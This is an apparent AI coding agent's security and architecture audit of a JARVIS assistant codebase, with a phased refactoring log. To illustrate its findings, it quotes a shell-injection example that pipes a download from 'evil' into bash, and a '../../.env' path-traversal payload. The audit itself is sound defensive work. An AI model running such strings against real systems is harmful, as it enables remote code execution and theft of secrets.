# JARVIS V5 → V6 Audit

Date: 2026-08-19
Scope: full repository (`core/` 111 files/~16.4k lines, `services/` 111 files/~17.6k lines, `server/` 39 files/~6.5k lines, plus `config/`, `utils/`, `deploy/`, root scripts).

## 0. Headline findings (act on these regardless of V6 timeline)

1. **Unauthenticated arbitrary file read.** `GET /stark/voice/audio` (`server/routes/voice.py:256-293`) has no auth dependency and builds a filesystem path directly from an unsanitized `?file=` query param before serving it with `FileResponse`. Anyone who can reach the API can request `?file=../../.env` and read secrets off the server. This is the single most severe finding in the audit.
2. **Live-shaped credential committed to git.** `mcp_config.json` (tracked, not gitignored) hardcodes what looks like a real bearer token for `JARVIS_API_TOKEN` — the master credential gating the whole API — plus a local absolute path leaking the developer's OS username. Treat as compromised; rotate `JARVIS_API_TOKEN` and scrub the file to read from env.
3. **Shell-injection primitive.** `core/tools/system.py:102-114` (`run_shell`) allowlists by `command.startswith(prefix)` but then runs the full, unmodified string via `subprocess.run(command, shell=True, ...)`. `"ls; curl evil/x|bash"` passes the prefix check. Reachable from the LLM-driven `run_shell` tool via `/stark/task`.
4. **AppleScript injection.** `core/tools/mac.py` escapes quotes in most functions but not in `quit_app()`, `focus_app()`, `is_app_running()`, or `create_reminder()`'s `title` — an app name/title containing `"` breaks out of the AppleScript string.
5. **Unauthenticated phone/SMS webhook.** `server/routes/stark_infrastructure.py:46-72` (`/stark/phone/call`, `/respond`, `/transcribed`, `/sms`) has no Twilio signature verification, unlike the equivalent endpoint in `final_features.py`. Anyone can POST and reach the LLM pipeline.
6. **CORS wildcard + credentials.** `ALLOWED_ORIGINS` defaults to `"*"` with `allow_credentials=True` (`config/settings.py:325`, `utils/security.py:202-204`) — a combination browsers/Starlette handle by reflecting the request Origin, defeating the intent of the wildcard.
7. **Stray tracked artifacts.** A root file literally named `n` is a 12KB zip archive of an old source snapshot, accidentally committed. `logs/immutable_audit.jsonl` is tracked in git and shipped into Docker images despite containing real chat content (a recipient email, a Gmail message ID) — the `.gitignore`/`.dockerignore` rules exclude `*.json`/`*.log` but not `.jsonl`.

None of these require the V6 rewrite to fix — they're small, surgical patches. I'd like to patch #1, #3, #4, #5, #6, and the `.jsonl` ignore gap now, and get your call on #2 (token rotation) and #7 (dropping `n` from history) since those touch git history / credentials outside my ability to rotate. Details below; see §9 for the plan.

## 1. Current architecture

- **Entry**: `app.py` → `uvicorn` → `server/api.py` (916-line FastAPI app). Boots defensively: the health router has an inline fallback if its import fails, and all other routers go through `_safe_import()` so one broken module doesn't take down boot. Docs (`/docs`, `/redoc`) are disabled outside `ENVIRONMENT=local` (a documented fix for a prior incident).
- **Request path**: `server/routes/*.py` (36 files, ~473 registered routes) and `server/websocket.py` (`/ws/chat`, now properly token-gated after a documented past incident where it had zero auth) both ultimately call into `core/brain_v2.py`.
- **The real cognitive pipeline is `core/brain_v2.py`** (1808 lines) — a monolith that defines its own `Intent → Validate → Plan → Execute` pipeline internally, duplicating what standalone `core/reasoning.py`, `core/validator.py`, `core/planner.py`, `core/executor.py`, `core/orchestrator.py` attempt separately. Those standalone modules are real and wired, but only reachable through opt-in `/stark/*` and `/mythos/*` side-door endpoints — never the default chat path. This is explicitly self-documented in the code (`core/orchestrator.py:8-13`, `core/agentic_loop.py:5-13`): "deliberately NOT wired into Brain.process()."
- **Model routing**: `core/llm/router.py` (885 lines) — a procedural hub with module-level mutable state (usage counters, response cache) that classifies queries into tiers and dispatches to `core/llm/{openai,cerebras,ollama,anthropic_client}.py`, each with its own ad-hoc `chat()` signature (no shared provider interface). A cleaner but unused sketch of a provider abstraction (`Provider` enum, `RouteResult`) already exists in `core/llm/cascade.py` — nothing calls it.
- **Memory**: `core/memory.py` (814 lines, the real system: short/long-term, facts, embeddings, compression) backed by `core/turso_store.py` (a documented, intentional persistence helper, not a competitor). `core/working_memory.py` and `core/persistence.py` are smaller and effectively unused.
- **Tools**: `core/tools/*` (browser, files, gmail, calendar, mac, search, spotify, system, vision, voice, web) plus `core/executor.py`'s dict-based dispatch table — the best-shaped piece of the existing "router" trio, though handlers are free functions with no schema/validation, not a `Tool` interface.
- **services/** (111 files) is a wide, largely non-overlapping set of integrations, automations, and security utilities. 106 of 111 are genuinely wired and used; only 4 files (~475 lines) are dead. Despite Iron-Man-flavored names (`combat_mode`, `defcon`, `gold_codes`, `stark_security`, `suit_assembly`...), nearly all of it is real functionality, not roleplay stubs — see §4.
- **Auth**: one shared `verify_token` dependency (`utils/security.py`, constant-time compare) applied per-router almost everywhere, with `protocols.py`/`sandbox.py` layering additional master-only and biometric-confirmation tiers for the most dangerous operations (lockdown, self-modification deploy). This is a genuinely solid defense-in-depth pattern already present in V5 — worth preserving in V6's permission model rather than replacing.
- **Global state**: 40+ bare module-level singletons across `core/` (`bus = EventBus()`, `brain = Brain()`, etc.), consumed via direct import-and-mutate rather than dependency injection. Circular imports are avoided almost entirely via lazy, function-local imports rather than clean module boundaries — a deliberate but fragile workaround that hides the real dependency graph.

## 2. Major subsystems (as they exist today, not as named in folders)

| Subsystem | Where | Status |
|---|---|---|
| Cognitive pipeline (intent/plan/execute) | `core/brain_v2.py` | Live, monolithic |
| Reasoning-strategy zoo (ToT, ReAct, GoT, self-consistency, reflexion, multi-agent, + ~20 single-technique modules) | `core/*.py` | Real, wired, but side-door only via `orchestrator.py` and opt-in routes |
| Model routing | `core/llm/router.py` | Live but procedural; `cascade.py` is an unused cleaner sketch |
| Memory | `core/memory.py` + `core/turso_store.py` | Live, coherent |
| Tool execution | `core/tools/*` + `core/executor.py` | Live, reasonable dispatch table, no schema layer |
| Agentic loop | `core/agentic_loop.py` | Side-door; parses free-text `THINK:`/`ACTION:` markers rather than structured tool-calling — inconsistent with `core/tool_calling.py` |
| Sandbox / self-modification | `core/sandbox.py` + `server/routes/sandbox.py` + `core/self_analysis.py` | Genuinely solid approval/audit scaffolding (multi-factor gate, backup, allowlist deploy); execution isolation itself is subprocess-only, no container/seccomp — self-documented limitation |
| Security/threat cluster | `services/{sentinel,siem,threat_detector,threat_intel,breach_monitor,red_team}.py` | 5 distinct, non-duplicate systems; `siem.py` is the canonical aggregator |
| Crypto cluster | `services/{crypto_security,quantum_crypto,zero_knowledge}.py` | All real implementations, none wired as primary auth; two are dead code (unimported) |
| Automation/scheduling | `services/{scheduler,predictive_scheduling,automation,autonomous_handler}.py` | 4 distinct responsibilities, not copies |
| Remote control | `services/{remote_control,mac_bridge}.py`, `services/mcp_server.py` | Real control of the user's actual Mac over Tailscale/ngrok; token-gated |
| Route layer | `server/routes/*.py` (36 files) | Sprawling but mostly distinct feature batches, not wholesale duplicates — two genuine route collisions found (§3) |

## 3. Duplicate / overlapping systems

- **`core/brain.py` (dead, 87 lines) vs `core/brain_v2.py` (live, 1808 lines)** — `brain.py` is an older, self-contained pipeline superseded by `brain_v2.py`. Safe to delete.
- **`GET /stark/memory/facts` registered twice**: `server/routes/memory.py:15` and `server/routes/brain_enhancement.py:124-125` (a semantic-search variant). Because `memory_router` registers first, FastAPI resolves it — `brain_enhancement.py`'s handler is unreachable dead code today.
- **`/stark/security/audit`** defined with different HTTP methods in `security_max.py` (POST, fresh audit) and `stark_infrastructure.py` (GET, cached result) — not a routing conflict but confusingly overlapping naming; worth consolidating.
- **`core/llm/cascade.py` vs `core/llm/router.py`** — `cascade.py` sketches a cleaner `Provider`/`RouteResult` abstraction than the procedural `router.py`, but is entirely unused. V6's `LLMProvider` interface should absorb `cascade.py`'s shape into `router.py`'s actual routing logic rather than starting from scratch.
- **`core/orchestrator.py` / `core/executor.py` / `core/agentic_loop.py` vs `core/brain_v2.py`** — the standalone trio is the closest existing analog to a classify→strategy→execute router, but `brain_v2.py` reimplements a parallel, simpler version of the same idea internally rather than using them. V6 should formalize one of these, not both.
- Everything else that looked like a naming collision on first pass (`threat_detector` vs `threat_intel` vs `sentinel` vs `siem`; `crypto_security` vs `quantum_crypto` vs `zero_knowledge`; `audit_log` vs `self_audit`; `scheduler` vs `predictive_scheduling` vs `automation` vs `autonomous_handler`; `morning_routine` vs `evening_routine`) turned out on inspection to be **deliberately distinct systems**, most with docstrings explicitly explaining why they aren't duplicates. No consolidation needed there beyond possibly grouping by subdirectory for discoverability.

## 4. Dead / unused code

Confirmed by whole-repo import grep, not filename guessing:

- `core/brain.py`, `core/emotional_simulation.py`, `core/ensemble.py`, `core/hierarchical_planning.py`, `core/persistence.py`
- `services/audio_intel.py`, `services/crypto_security.py`, `services/quantum_crypto.py`, `services/side_channel.py` (its one useful function, `constant_time_compare`, is reimplemented inline in `utils/security.py` instead of imported)
- `core/llm/cascade.py` (unused, but worth reviving rather than deleting — see §3)
- `core/working_memory.py` is nearly unused (1 external reference)

`services/mcp_server.py` shows zero importers but is **not dead** — it's a standalone entry point run separately (`python3 services/mcp_server.py`) for Claude Desktop's MCP integration. Flagging so it isn't deleted by mistake.

Total confirmed dead: ~9 files, roughly 1,500–2,000 lines. Small relative to the ~40k-line codebase — this is not a codebase full of cruft, it's a codebase with a handful of superseded files and a large number of legitimate-but-side-door features.

## 5. Security concerns (full list; §0 has the six most severe)

| Finding | Location | Severity |
|---|---|---|
| Unauthenticated path traversal / arbitrary file read | `server/routes/voice.py:256-293` | Critical |
| Live credential committed to git | `mcp_config.json:7` | Critical |
| Shell injection via prefix-only allowlist + `shell=True` | `core/tools/system.py:102-114` | High |
| AppleScript injection (unescaped quotes) | `core/tools/mac.py` (`quit_app`, `focus_app`, `is_app_running`, `create_reminder`) | High |
| Unauthenticated phone/SMS webhook, no Twilio signature check | `server/routes/stark_infrastructure.py:46-72` | High |
| Arbitrary file read via LLM code-review tool, no base-dir restriction | `services/dev_intel.py:93-125`, reachable via `server/routes/new_features.py:127-142` | Medium-High (token-gated, but unrestricted path) |
| CORS wildcard + `allow_credentials=True` | `config/settings.py:325`, `utils/security.py:202-204` | Medium |
| SSH `StrictHostKeyChecking=no` to reach user's Mac | `services/remote_control.py:38` | Medium (scoped to Tailscale network) |
| `ufw`-based firewall mutation with unvalidated IP format | `services/stark_security.py:100-107` | Low (list-args, not shell; currently unwired to any route) |
| `os.system()` with f-string path interpolation | `services/voice.py:133` | Low (path is server-generated today, not user input) |
| Rate limiting only on one endpoint (60s/60req), sophisticated adaptive limiter exists but unwired | `utils/security.py:194-200`, `services/adaptive_ratelimit.py` | Low-Medium |
| Tracked `.jsonl` audit log with real chat content shipped in Docker image | `logs/immutable_audit.jsonl` | Medium (data exposure, not RCE) |

No hardcoded secrets found anywhere in `core/`, `services/`, `server/`, or `utils/` beyond the `mcp_config.json` token — every other credential is loaded via `os.getenv`/`config.settings` with empty-string defaults that fail open for genuinely optional integrations, and fail closed for the sandbox self-modification token specifically. `resurrection.py` (disaster-recovery identity/memory restore via Shamir secret sharing) is a manually-run CLI tool, not an autonomous self-modification path — it prints recovered keys to stdout for manual `.env` pasting, which is a minor shoulder-surfing/shell-history risk but not a structural one.

## 6. Technical debt (non-security)

- One 1808-line monolith (`brain_v2.py`) holding the entire cognitive pipeline, duplicating smaller standalone modules that already do the same job in isolation.
- 40+ bare module-level singletons, consumed by direct import-and-mutate — no dependency injection anywhere.
- Circular imports avoided via lazy, function-local imports rather than explicit module boundaries — hides the true dependency graph from static tooling.
- No shared `Tool`/`LLMProvider`/`ReasoningStrategy` interfaces — every "strategy" or "provider" is an independent class/function with its own ad-hoc shape.
- `agentic_loop.py` parses free-text `THINK:`/`ACTION:`/`COMPLETE:` markers instead of using the structured tool-calling already implemented in `core/tool_calling.py` — fragile, inconsistent with the rest of the codebase.
- Websocket (`server/websocket.py`) re-implements lockdown/threat-classification/validation logic in parallel to `server/routes/chat.py` instead of sharing it — the inline comments document this already caused a real lockdown-bypass bug once.
- `core/sandbox.py` is self-documented as process-isolation-only with a static banned-import string scan, not a real OS-level sandbox — fine as a v1, but should not be assumed to contain a truly adversarial coding agent.

## 7. Recommended architecture

The proposed `jarvis/{app,cognitive,memory,agents,tools,perception,integrations,security,runtime,ui,tests}/` layout from the directive maps reasonably cleanly onto what exists, with these adjustments based on what the audit found:

- `cognitive/router/` = formalize `core/orchestrator.py`'s classify-and-dispatch shape, but make it the *only* path (replace `brain_v2.py`'s internal reimplementation, don't run both).
- `cognitive/reasoning/` = give every existing strategy module (ToT, ReAct, GoT, self-consistency, reflexion, multi-agent, + the ~20 single-technique modules) one shared `ReasoningStrategy` interface; keep the modules, wrap them, retire the string-keyed dispatch.
- `cognitive/planning/` = `core/planner.py` + `core/hierarchical_planning.py` (currently dead — revive under the interface or drop; audit didn't find a reason it's unused beyond nothing calling it yet).
- `cognitive/verification/` = new; nothing in V5 does structured plan→execute→observe→verify today, `core/validator.py` is the closest but validates input, not outcomes.
- `cognitive/uncertainty/` = merge `bayesian.py`, `epistemic.py`, `uncertainty.py` behind one `Decision`/confidence interface — currently three adjacent but disconnected modules.
- `memory/` = `core/memory.py` + `core/turso_store.py` split along the working/episodic/semantic/procedural lines the directive wants; this is real restructuring, not just a folder move, since `memory.py` currently mixes all of these together.
- `agents/` = `core/agents/{coder,researcher,planner_agent,deep_research}.py` already exist and roughly match; give them a shared `Agent.run()` interface.
- `tools/registry/` + `tools/permissions/` = new; wrap `core/executor.py`'s dispatch table and `core/tools/*` with the `Tool(name, risk_level, requires_confirmation, ...)` schema the directive specifies. This is the single highest-leverage new piece — it directly fixes the shell-injection and arbitrary-file-read findings by making risk/permission a declared property of every tool instead of ad hoc per-function checks.
- `security/` = mostly exists already (`utils/security.py`, `services/sentinel.py`, `services/siem.py`, the master/biometric tiers in `protocols.py`/`sandbox.py`) — consolidate rather than rebuild.
- `runtime/events/` = `core/event_bus.py` already exists and is used; keep.
- `integrations/` = `core/tools/{gmail,google_calendar,spotify,mac}.py` + `services/{mac_bridge,remote_control,home_automation}.py`.

## 8. Risk assessment

- **Highest risk of the whole migration**: collapsing `brain_v2.py` into the new router without breaking the ~473 existing routes that call into it, given how much side-door reasoning logic already assumes `brain_v2.py`'s specific dataclasses. This needs an adapter/shim period, not a flag-day cutover.
- **Second highest**: the tool permission system, because it's genuinely new (nothing in V5 declares risk level per tool) and touches every code path that currently calls `core/executor.py` or `core/tools/*` directly.
- **Lowest risk, do first**: the six items in §0 — none require touching the cognitive pipeline, all are independently testable, and three are active vulnerabilities.
- **Irreversible/needs your input before I act**: rotating `JARVIS_API_TOKEN` (I don't know if the committed value is still live in any deployment), and scrubbing `n` / `mcp_config.json` / `logs/immutable_audit.jsonl` from git history (rewriting history is disruptive to any existing clones/PRs and you should decide whether that's warranted vs. just fixing HEAD going forward).

## 9. Proposed phased plan

1. **Phase 0 — critical security patches** ✅ done (PR #5): fixed the unauthenticated file read, the shell-injection allowlist, AppleScript quote escaping, the phone/SMS webhook auth, CORS wildcard+credentials, and the `.jsonl` gitignore/dockerignore gap. Deleted the confirmed-dead files (§4). No architectural change.
2. **Phase 1 — interfaces** ✅ done: introduced `ReasoningStrategy`, `LLMProvider`, `Tool`, `Agent` protocols in `core/interfaces/`, without moving any files; adapted existing modules to implement them in place. See §11 for exactly what this did and didn't cover.
3. **Phase 2 — Cognitive Router** ✅ done, re-scoped: reading `brain_v2.py` in full during design showed its `Brain.process()` is ~520 lines of safety-critical, incident-hardened logic with 16+ existing call sites, not dead-weight duplicating `orchestrator.py` — see §11 for what actually shipped and why "retire brain_v2.py's internal duplicate pipeline" (as originally written above) was the wrong scope.
4. **Phase 3 — Tool Registry + permissions** ✅ done: found there are three independent tool dispatchers, not one registry with gaps — see §11 for scope and what's real enforcement vs. still deferred.
5. **Phase 4 — Verification Engine** ✅ done: see §11 for scope (a real, if intentionally bounded, first version — not exhaustive per-tool verification).
6. **Phase 5 — Memory unification** ✅ done, re-scoped: `core/memory.py` already implements the working/episodic/semantic/procedural/emotional/prospective split cleanly — this line's premise was wrong. See §11 for what was actually missing and fixed.
7. **Phase 6 — Agent standardization**: shared `Agent.run()` over the existing four agents.
8. **Phase 7 — Security hardening pass 2**: consolidate the security/crypto clusters under `security/`, wire the adaptive rate limiter, replace `core/sandbox.py`'s process-only isolation if real containerization is available in the target deploy environment.
9. **Phase 8 — Observability + testing + benchmark suite**.
10. **Phase 9 — Deprecation cleanup**: remove what Phase 1-8 superseded, once nothing depends on it.

Each phase ends with tests run, regressions fixed, docs updated, and a report of what changed — per the directive's rules.

## 10. What I need from you before proceeding

- ~~OK to execute Phase 0 now~~ — done, see §11.
- ~~Committed token in `mcp_config.json`~~ — resolved: removed from HEAD, switched to placeholder; token rotation (if needed) is the user's, wherever `JARVIS_API_TOKEN` is actually issued.
- ~~Pacing for Phases 1-9~~ — resolved: proceed phase-by-phase, checkpoint before Phase 2's router cutover and before final deprecation/deletion.

## 11. Progress log

### Phase 1 — interfaces (done)

Added `core/interfaces/{reasoning,llm_provider,tool,agent}.py` — four protocols (`ReasoningStrategy`, `LLMProvider`, `Tool`, `Agent`), each with a lazily-built registry. Every existing module kept its original functions/classes and every existing caller (`core/orchestrator.py`, `server/routes/*.py`, `core/tool_calling.py`, ...) is untouched and still the live code path — these are purely additive adapter classes appended to the bottom of each file:

- **ReasoningStrategy** (8 strategies): `DirectStrategy` (new, lives in the interface module itself — no existing module for the trivial single-call case), plus adapters in `core/reasoning.py` (`ChainOfThoughtStrategy`, `VerifiedReasoningStrategy`), `core/react.py` (`ReActStrategy`), `core/tree_of_thought.py` (`TreeOfThoughtStrategy`), `core/graph_of_thought.py` (`GraphOfThoughtStrategy`), `core/self_consistency.py` (`SelfConsistencyStrategy`), `core/multi_agent.py` (`MixtureOfAgentsStrategy`). `core/reflexion.py` deliberately has no adapter — it's a lesson-store/evaluator, not a query-answering strategy, and doesn't fit the interface.
- **LLMProvider** (4 providers): adapters in `core/llm/openai.py` (`GroqProvider`), `core/llm/cerebras.py` (`CerebrasProvider`), `core/llm/ollama.py` (`OllamaProvider`), `core/llm/anthropic_client.py` (`AnthropicProvider`). `core/llm/router.py` (the real routing/fallback/caching logic) and `core/llm/cascade.py` (the unused sketch) are both untouched.
- **Tool** (9 tools): `core/executor.py` gained a `TOOLS: dict[str, Tool]` registry over its existing dispatch table, with risk-level/confirmation/reversibility/permissions metadata per tool. `execute_step()` itself is untouched — nothing enforces this metadata yet (see below).
- **Agent** (4 agents): adapters in `core/agents/coder.py` (`CoderAgent`), `core/agents/researcher.py` (`ResearcherAgent`), `core/agents/planner_agent.py` (`PlannerAgentAdapter`), `core/agents/deep_research.py` (`DeepResearchTaskAgent`, preserving its fire-and-forget/poll semantics — `run()` returns once the background research thread starts, not once the report is ready).

**Verified** (clean venv, full dependency install): app boots with all 46 routes registered, no import regressions. All 4 registries build and `isinstance`-check correctly. All 8 reasoning strategies' `solve()` and all 4 providers' `generate()` were called end-to-end through real async execution — with no API keys configured in the verification environment they degraded exactly the way the rest of the codebase already does (`[JARVIS OFFLINE]` / clear exceptions naming the missing key), never crashing at the interface layer. `Tool.execute()` was run for real (`system_info`, `read_file`). Both `CoderAgent.run()` and `DeepResearchTaskAgent.run()` were run for real, including `success=False` correctly propagating when generated code fails its syntax check.

**Explicitly not done in Phase 1** (deferred to the phases named in §9, not overlooked):
- No permission/confirmation *enforcement* — `Tool.requires_confirmation`/`risk_level` are declared but nothing checks them before a tool runs. That's Phase 3.
- Tool coverage is only `core/executor.py`'s 9 tools, not `core/tools/mac.py`/`gmail.py`/`google_calendar.py`/`spotify.py`/etc., and not reconciled with `core/tool_calling.py`'s separate `TOOLS_SCHEMA` (which uses different names for overlapping concepts, e.g. `system_info` vs `get_system_status`). Also Phase 3.
- No routing changes — `core/orchestrator.py` still dispatches by its own `if/elif` on `query_type`, not through the new registries. That's Phase 2.

### Phase 2 — Cognitive Router (done, re-scoped)

Design-phase discovery: `core/brain_v2.py`'s `Brain.process()` (~520 lines) is not the "duplicate pipeline" the original plan assumed. It's the live, safety-critical entry point for the whole system — an early-exit gauntlet (Mayday distress phrase, security-protocol activation refusal that explicitly prevents JARVIS from *fabricating* "Lockdown active, sir" compliance, sandbox self-improvement actions, egress filtering that redacts secrets/PII before a response reaches the user, ...) followed by `Reasoner → Validator → ProtocolEngine → Planner → Executor`, with multiple comments documenting specific real production incidents this exact ordering already fixed. It also has 16+ existing call sites across 10 files (`server/api.py`, `server/websocket.py`, `server/routes/{chat,voice,glasses,final_upgrade}.py`, `services/{phone,webhooks,messaging,predictor,mcp_server}.py`), two of which import `Reasoner`/`Validator`/`Executor` directly, and `server/websocket.py` additionally depends on `has_early_exit_trigger()` peeking into `Brain.process()`'s own dispatch logic for its streaming decision.

Given that, "retire brain_v2.py's internal duplicate pipeline" (Phase 2's original description above) would have meant rewriting incident-hardened logic and migrating 16+ call sites for a pure rename with no behavioral benefit — the flag-day cutover the migration rules warn against. Confirmed the re-scope with the user before writing any code. What Phase 2 actually did instead, all verified as behavior-preserving:

1. **Extended the `ReasoningStrategy` registry with the 8 engines `brain_v2` actually dispatches to.** `Planner._select_reasoning_engine()`/`Executor._reasoning_engine()` route to `six_hats`, `premortem`, `fermi`, `first_principles`, `constraint_satisfaction`, `game_theory`, `information_value`, `mental_models` — a completely different set from the 8 Phase 1 wired up (those came from `orchestrator.py`'s side-door dispatch; the two "reasoning engine" concepts had never actually overlapped). Added adapter classes to each of the 8 modules, named to match `brain_v2`'s own engine-name strings exactly (`info_value` not `information_value`, `constraint_solver` not `constraint_satisfaction`) so the registry lookup in step 2 works unchanged. The registry is now 16 strategies total.
2. **Redirected `Executor._reasoning_engine()`** to look up `core.interfaces.reasoning.get_strategy(engine)` instead of a local if/elif importing each module directly — same 8 engines, same `Planner` selection logic (untouched), same output. This is the one real code-path change in Phase 2, and it's internal to `brain_v2.py` — no external caller's contract changed.
3. **Found and fixed a real bug this redirect would otherwise have introduced**: `POST /stark/chat/simple` (`server/api.py:818`) calls `brain.process_dict()` directly from inside an `async def` route handler — not via a thread executor like every other caller — so it already has a running event loop on that thread. A plain `asyncio.run()` inside the new registry-routed `_reasoning_engine()` would raise "cannot be called from a running event loop" specifically for that endpoint. Added `Executor._run_async()`, a small helper that detects a running loop and, if present, runs the coroutine on a fresh loop in a separate thread instead of calling `asyncio.run()` directly.
4. **Added `core/cognitive_router.py`** as the new formally-designated entry point for future integrations — currently a thin facade (`CognitiveRouter.route()` calls `brain.process_dict()` unchanged, zero logic difference). The 16 existing call sites were deliberately left as-is rather than mass-migrated, per the re-scope above.

**Explicitly not done in Phase 2** (deferred, not overlooked): decomposing `Brain.process()`'s early-exit gauntlet, `Validator`, `ProtocolEngine`, or egress filtering into named pipeline stages; migrating any of the 16 existing `brain.process_dict()` call sites to the new router.

**Verified**: full app boots with the same 46 routes as Phase 1 (no regression). A dedicated regression script monkeypatched `core.llm.router.think` and confirmed, for all 8 engines, that `get_strategy(engine).solve()`'s answer text is byte-identical to what the old if/elif computed from the same underlying engine call (including `fermi`'s two-field concatenation and `mental_models`' derived `mental_model_{used_model}` provider string). A second script confirmed `Executor._reasoning_engine()` works correctly both with no event loop running (the common case) *and* called from inside an already-running loop (the `/stark/chat/simple` case `_run_async()` exists for) — the second case is the actual scenario a naive `asyncio.run()` would have crashed on, confirmed by testing it would have before adding the fix.

### Phase 3 — Tool Registry + permissions (done)

Design-phase discovery: there are **three independent tool dispatchers**, not one registry with gaps.

1. `core/executor.py` (9 tools) — Phase 1's original coverage. Mostly side-door (`core/react.py`, `core/agentic_loop.py`, `core/agents/planner_agent.py`).
2. `core/mac_dispatcher.py` (32 tools: app/system control, 8 Spotify, 6 Gmail, + a `chat` fallback) — its own independent dict registry, LLM-driven natural-language parser, and `if/elif` executor. **This is the one actually on the live default chat path** (`core.brain_v2.Executor._mac_control()`) — Phase 1 missed it entirely.
3. `core/tool_calling.py` (7 tools, OpenAI-function-calling-schema-shaped) — used by exactly one side-door route (`POST /stark/tools/think`); its own `mac_control` tool wraps all of #2 as one opaque call.

`core/tools/gmail_send.py` already had a real, working `requires_confirmation`-shaped safety pattern for one tool: `draft_email()` never sends, only stores a pending draft (file-backed, 10-minute expiry); a separate, explicit `send_pending_draft()` call is the only path that actually sends, and it's audit-logged. Generalized rather than replaced.

Confirmed the scope with the user before implementing, given declaring risk metadata is safe/additive but *enforcing* it needs a real mechanism, and blocking already-instant actions (app control, media control) would be a genuine UX regression, not free. What shipped:

1. **`core/interfaces/permissions.py`** (new) — a shared, in-memory pending-action store (`propose`/`confirm`/`discard`, `EXPIRY_SECONDS = 600`) generalizing `gmail_send.py`'s pattern. `gmail_send.py` itself is untouched — it already works, and rewiring proven-correct code onto shared infrastructure for its own sake wasn't worth the regression risk.
2. **`Tool.execute()`** (`core/interfaces/tool.py`) now takes `confirmed: bool = False`. When `requires_confirmation=True` and not confirmed, it registers a pending action via the new store instead of running the handler, returning `ok=False, error="confirmation_required"`.
3. **Three separate registries, not a flat merge**: `registry()` (executor's 9), `mac_registry()` (mac_dispatcher's 32, named `TOOL_REGISTRY` there — `TOOLS` was already taken by the existing LLM-prompt description dict), `tool_calling_registry()` (tool_calling's 7, named `TOOL_OBJECTS` there). Kept separate because `core/executor.py` and `core/tool_calling.py` both define a tool literally named `web_search`, backed by two different implementations (`core.deep_search` vs. `core.tools.search.SearchCascade`) — a flat merge would silently let one clobber the other. `get_tool(name)` only searches the executor registry; callers meaning the other two must call `mac_registry()`/`tool_calling_registry()` explicitly. Reconciling the `web_search` naming collision itself is real future work, not attempted here.
4. **Risk classification for all ~40 tools**, honestly assigned per-tool (read-only queries and routine reversible actions — open/quit apps, media control, clipboard, notifications — are `low`/no-confirmation; only 3 tools ended up `requires_confirmation=True`: `run_shell`, `write_file` (executor.py), `empty_trash` (mac_dispatcher.py)). `gmail_send`/`gmail_confirm_send`/`gmail_discard_draft` are deliberately **not** gated by the new mechanism even though sending mail is genuinely high-risk — they already have their own complete draft-then-confirm flow, and gating them again would mean confirming a confirmation.
5. **Two different enforcement shapes, matched to what's actually possible in each dispatcher's context**:
   - `core/executor.py::execute_step()` runs inside autonomous, multi-step task execution with no natural point to pause for a future chat turn — a gated tool **fails closed**: refuses cleanly with `confirmation_required: true` rather than silently proceeding or hanging. A caller with a real confirmation channel can pass `step["confirmed"]=True`; no current caller does.
   - `core/mac_dispatcher.py::dispatch()` runs fresh per chat message, so there **is** a natural next turn — gated tools get a real two-turn flow: propose ("Are you sure, sir? ... Say 'confirm' ... or 'cancel'"), then a later message either confirms (executes the *original* proposed action, not a fresh parse of the confirm phrase) or is treated as an implicit discard. Any reply other than an explicit confirm phrase discards the pending action — including the user simply changing topics — rather than leaving it live for up to 10 minutes waiting on a possibly-coincidental future "yes".

**Explicitly not done in Phase 3** (deferred, not overlooked): reconciling the `web_search` naming collision between registries 1 and 3; extending confirmation enforcement to `core/tool_calling.py`'s own dispatch loop (unnecessary — its `run_task`/`mac_control` wrappers delegate to `core/executor.py`/`core/mac_dispatcher.py`, which already enforce internally); building a persistent (vs. in-memory) pending-action store.

**Verified**: full app boots with the same 46 routes as Phase 2 (no regression). All three registries build and validate (32+9+7 = 48 tools total... executor's `web_search` and tool_calling's `web_search` counted separately, by design). Confirmed exactly the 3 intended tools require confirmation and none other. Behavioral tests (not just import checks): `execute_step()` refuses `run_shell`/`write_file` and returns a clean `confirmation_required` error, a routine tool (`system_info`) is unaffected, and an explicit `confirmed=True` override works. `mac_dispatcher.dispatch()`: a routine tool (`open_app`) still executes immediately; `empty_trash` proposes without executing; an unrelated follow-up message discards the pending action without executing it; a `"confirm"` reply executes the originally-proposed action. A separate regression test confirmed `gmail_send`'s existing flow is completely untouched — drafting doesn't register a generic pending action, and `"send it"` still routes through `gmail_confirm_send`'s own mechanism exactly as before.

### Phase 4 — Verification Engine (done, intentionally bounded)

Nothing in V5 previously distinguished "the handler ran without a Python exception" from "the action actually worked." `core/validator.py` validates response *text quality* (empty, truncated, contains an error marker) — a different concern. Several of the audit's own headline findings (a fabricated Windows system report on a Linux host, a fabricated "note saved permanently" when it wasn't) were exactly this gap: a call that didn't raise, but whose own return value said it failed, treated as a success anyway.

Grepped every `core/tools/*.py` handler and found they already consistently self-report failure one of two ways: `{"error": "..."}` for dict-returning tools, or a `"[Xxx error: ...]"` / `"[Error] ..."` wrapped string for text-returning ones — an existing convention, not something to invent. Built on it rather than requiring every tool to be rewritten:

1. **`core/interfaces/verification.py`** (new) — `VerificationResult(success, confidence, evidence, errors, recommended_action)` per the master directive's shape; `verify_tool_result()` detects the existing error convention (plus `core.llm.router`'s literal `"[JARVIS OFFLINE] ..."` fallback text, which doesn't contain the word "error" so the bracket-pattern alone would have missed it — caught in review before it shipped); `is_transient()` classifies a narrow, conservative set of error substrings (timeout, connection refused, rate limit) as worth retrying, everything else (allowlist rejections, "not configured", "not found") as permanent; `with_retry()` is a generic helper enforcing a hard attempt cap (default 3) and exponential backoff, per the "never endlessly retry" rule — retry is recommended only when an error looks transient *and* the tool is marked `reversible=True` in the Phase 3 registry.
2. **Rollback**: deliberately *not* attempted generically. There's no safe automatic way to undo most of JARVIS's ~40 tools (you can't un-send a notification), and the one real rollback mechanism that already exists (`core/sandbox.py`'s file backup/restore) is scoped to code self-modification, a different subsystem. A `VerificationResult` can still carry `recommended_action="rollback"` as a signal; nothing acts on it automatically yet.
3. **Wired into `core/executor.py::execute_step()` only** — not `core/mac_dispatcher.py` or `core/tool_calling.py`. This is the one dispatcher where a chain of tool calls (`core/react.py`, `core/agents/planner_agent.py`) makes decisions off each previous call's reported success, so an undetected fabricated success compounds — the highest-leverage, most bounded place to start. `execute_step()`'s return type/shape is unchanged (still a plain string) — retry happens transparently underneath; no caller needed to change. The Phase 3 confirmation gate still runs first, unaffected — a tool requiring confirmation never reaches the handler/retry logic at all.

